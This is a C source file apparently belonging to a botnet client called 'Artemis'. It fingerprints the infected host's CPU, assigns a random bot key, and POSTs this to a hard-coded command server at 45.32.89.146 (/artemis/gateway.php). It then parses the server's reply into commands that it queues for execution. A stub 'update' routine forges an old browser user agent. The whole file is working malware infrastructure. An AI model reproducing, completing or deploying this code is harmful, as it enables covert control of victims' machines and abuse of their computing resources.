#include "../include/main.h"

/*
Prepare for the spam of inline
Seriously tho I use a lot of inline here so that the code is a bit easier to
understand and looks a hell of a lot nicer
But since they're only called once inline is much more efficient

Update:
Okay so I've started using __attribute__((always_inline)) since gcc doesn't care
about ur optimizations 99% of the time
"It can give the opposite effect blablabla"
Yeah well using -fdump-tree-all clearly shows that it forces it to be inlined
which for this is a lot easier thx
*/

struct _comminfo
{
	char 	*botkey;
	uint8_t  cores;
	uint16_t mhz;
	uint16_t bogos;
	uint8_t  bit;
	char 	*arch;
} comminfo;

static inline __attribute__((always_inline)) uint16_t _bogos(void)
{
	int cmdline = open("/proc/cpuinfo", O_RDONLY);
	unsigned char linebuf[4096];
	while (fdgets(linebuf, 4096, cmdline) != NULL)
	{
		if (strcasestr((const char *)linebuf, "bogomips") != NULL)
		{
			unsigned char *pos = linebuf + 8;

			while (*pos == ' ' || *pos == '\t' || *pos == ':')
				pos++;
			while (pos[strlen((const char *)pos) - 1] == '\r' || pos[strlen((const char *) pos) - 1] == '\n')
				pos[strlen((const char *)pos) - 1] = 0;

			if (strchr((const char *)pos, '.') != NULL)
				*strchr((const char *)pos, '.') = 0x00;

			close(cmdline);
			return atoi((const char *) pos);
		}
		zero(linebuf, 4096);
	}
	close(cmdline);
	return 0;
}

static inline __attribute__((always_inline)) uint8_t _cores()
{
	uint8_t       totalcores = 0;
	int		  cmdline    = open("/proc/cpuinfo", O_RDONLY);
	unsigned char linebuf[4096];
	while (fdgets(linebuf, 4096, cmdline) != NULL)
	{
		if (strcasestr((const char *) linebuf, "bogomips") != NULL)
			totalcores++;
		memset(linebuf, 0, 4096);
	}
	close(cmdline);
	return totalcores;
}

static inline __attribute__((always_inline)) uint16_t _mhz() // Getz CPU speed in mhz
{
	int		  cmdline = open("/proc/cpuinfo", O_RDONLY);
	unsigned char linebuf[4096];
	while (fdgets(linebuf, 4096, cmdline) != NULL)
	{
		if (strcasestr((const char *) linebuf, "cpu mhz") != NULL)
		{
			unsigned char *pos = linebuf + 8;

			while (*pos == ' ' || *pos == '\t' || *pos == ':')
				pos++;
			while (pos[strlen((const char *) pos) - 1] == '\r' ||
					pos[strlen((const char *) pos) - 1] == '\n')
				pos[strlen((const char *) pos) - 1] = 0;
			if (strchr((const char *) pos, '.') != NULL)
				*strchr((const char *) pos, '.') = 0x00;

			close(cmdline);
			return atoi((const char *) pos);
		}
		memset(linebuf, 0, 4096);
	}
	close(cmdline);
	return 0;
}

// Why does static inline work but inline on its own not work?
// Gotta look this up when I get back on wifi

static inline __attribute__((always_inline)) uint8_t _bit(void) // Gets 32 or 64 bit arch
{
	if ((size_t) -1 > 0xffffffffUL)
		return 64;
	else
		return 32;
}

void comm_init()
{
	struct utsname uinfo;
	uname(&uinfo);
	// printd("%s", uinfo.sysname);
	// printd("%s", uinfo.nodename);
	// printd("%s", uinfo.release);
	// printd("%s", uinfo.version);
	// printd("%s", uinfo.machine);
	// printd("%s", uinfo.domainname);

	comminfo.botkey = rand_string(20);
	comminfo.cores  = _cores();
	comminfo.mhz    = _mhz();
	comminfo.bogos  = _bogos();
	comminfo.bit    = _bit();
	comminfo.arch   = uinfo.machine;
}

static inline __attribute__((always_inline)) void processRecv(char *data)
{
	char *string = data;
	char *token  = strchr(data, '*');

	while (token != NULL)
	{
		/* String to scan is in string..token */
		*token++ = '\0';

		char *_type = strtok(string, "|");
		char *param = strtok(NULL, "|");
		int type = atoi(_type);
		proc_add(type, param);

		string = token;
		token = strchr(string, '*');
	}
	return;
}

bool comm_comm(void)
{
	printd("POSTing");
	char 	*reply = calloc(2048, sizeof(char *)),
			*message = calloc(1024, sizeof(char *)),
			*postreq;
			
	int sock, postlen;
	struct sockaddr_in server;

	server.sin_addr.s_addr = inet_addr(COMM_ADDR);
	server.sin_family = AF_INET;
	server.sin_port = htons(COMM_PORT);

	// Create and connect
	if (((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) || (connect(sock, (struct sockaddr *) &server, sizeof(server)) < 0))
		return false;

	int fsize = asprintf(
					&postreq,
					"bkey=%s&key=%s&cores=%d&mhz=%d&bogus=%d&version=%s&arch=%d&arch2=%s",
					comminfo.botkey,
					COMM_KEY,
					comminfo.cores,
					comminfo.mhz,
					comminfo.bogos,
					MAIN_VERSION,
					comminfo.bit,
					comminfo.arch);
	if (fsize == -1)
	{
		printd("Error creating postreq");
		goto failure2;
	}
	postlen = strlen(postreq);

	sprintf(message,
			"POST /artemis/gateway.php HTTP/1.1\r\n"
			"cache-control: no-cache\r\n" // Who needs cache anyway
			"User-Agent: Artemi$\r\n"
			"Accept: */*\r\n"
			"Host: 45.32.89.146\r\n"
			"Content-type: application/x-www-form-urlencoded\r\n"
			// "Accept-encoding: gzip, deflate\r\n"
			"Content-length: %d\r\n"
			"Connection: close\r\n"
			"\r\n"
			"%s",
			postlen, postreq);

	if (send(sock, message, strlen(message), 0) < 0)
		goto failure1;

	if (recv(sock, reply, 6000, 0) < 0)
		goto failure1;

	// Close socket here?

	char *str = strchr(reply, '*');
	if (str != NULL)
	{
		memmove(str, str + 1, strlen(str)); // Remove * at start
		strcat(str, "*");
		processRecv(str);
	}

	free(postreq);
	free(reply);
	free(message);
	return true;
failure1:
	free(postreq);
failure2:
	free(reply);
	free(message);
	return false;
}

bool update(char *url, char *site)
{
	char *msg;
	int size = asprintf(&msg,
			"GET /%s HTTP/1.1"
			"User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)"
			"Host: %s"
			// "Accept-Language: en-us"
			// "Accept-Encoding: gzip, deflate"
			"Connection: Keep-Alive",
			url,
			site);
	if (size == -1)
		return false;

	return true;
}
